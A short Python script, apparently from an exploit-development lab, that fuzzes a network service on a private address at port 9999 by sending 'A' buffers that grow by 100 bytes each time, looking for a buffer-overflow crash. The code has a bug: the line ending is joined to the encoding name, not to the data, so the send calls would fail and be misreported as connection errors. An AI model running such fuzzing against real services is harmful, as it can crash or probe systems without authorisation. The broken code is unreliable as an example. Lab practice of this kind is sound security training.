import socket, time, sys

ip = "192.168.133.131"
port = 9999
timeout = 5

# Create an array of increasing length buffer strings.
buffer = ['A']
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send(bytes("Fuzz ", "latin-1" + "\r\n"))
        s.recv(1024)
        s.send(bytes(string, "latin-1"  + "\r\n"))
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
